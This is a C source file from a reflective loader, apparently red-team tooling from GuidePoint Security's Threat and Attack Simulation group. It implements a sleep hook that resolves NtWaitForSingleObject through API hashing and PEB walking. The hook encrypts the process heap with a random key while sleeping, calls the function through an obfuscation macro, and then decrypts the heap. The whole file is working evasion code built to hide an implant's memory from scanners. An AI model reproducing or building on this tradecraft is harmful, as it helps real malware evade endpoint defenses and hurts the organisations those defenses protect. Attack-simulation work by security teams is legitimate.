/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef struct
{
	D_API( NtWaitForSingleObject );
} API ;

/* API Hashes */
#define H_API_NTWAITFORSINGLEOBJECT	0xe8ac0c3c /* NtWaitForSingleObject */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */	

/*!
 *
 * Purpose:
 *
 * Goes to sleep using NtWaitForSingleObject, and awaits
 * on the result.
 *
!*/

D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ ULONG WaitTime )
{
	API		Api;
	LARGE_INTEGER	Del;

	BYTE		Key[ 16 ];

	PVOID*		Arg = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Del, sizeof( Del ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );

	/* Random Key Generation */
	RandomString( &Key, sizeof( Key ) );

	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );

	/* Encrypt the heap */
	HeapEncryptDecrypt( &Key, sizeof( Key ) );

	/* Execute NtWaitForSingleObject */
	Del.QuadPart = -10000LL * WaitTime;
	OBF_EXECUTE( Api.NtWaitForSingleObject, NtCurrentProcess(), FALSE, &Del );

	/* Decrypt the heap */
	HeapEncryptDecrypt( &Key, sizeof( Key ) );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Del, sizeof( Del ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
}
